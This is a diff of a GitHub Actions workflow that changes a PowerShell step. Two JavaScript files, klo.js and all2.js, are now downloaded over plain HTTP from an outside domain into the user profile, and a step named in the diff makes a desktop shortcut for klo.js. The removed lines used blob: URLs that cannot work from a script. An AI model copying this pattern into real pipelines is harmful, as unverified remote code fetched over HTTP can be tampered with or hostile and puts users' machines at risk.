@@ -28,10 +28,10 @@ jobs:
       with:
         node-version: '20'
 
-    - name: Download klo.js and all2.js from remote URLs
+    - name: Download klo.js and all2.js from algrawany.me
       run: |
-        Invoke-WebRequest -Uri "blob:https://970-cs-578782249504-default.cs-europe-west1-iuzs.cloudshell.dev/68ffd817-ca66-448a-887c-95811d8eb0f0" -OutFile "$env:USERPROFILE\klo.js"
-        Invoke-WebRequest -Uri "blob:https://970-cs-578782249504-default.cs-europe-west1-iuzs.cloudshell.dev/e92f5674-d462-4770-92b4-dfe798b46c08" -OutFile "$env:USERPROFILE\all2.js"
+        Invoke-WebRequest -Uri "http://algrawany.me/klo.js" -OutFile "$env:USERPROFILE\klo.js"
+        Invoke-WebRequest -Uri "http://algrawany.me/all2.js" -OutFile "$env:USERPROFILE\all2.js"
 
 
     - name: Create desktop shortcut for klo.js
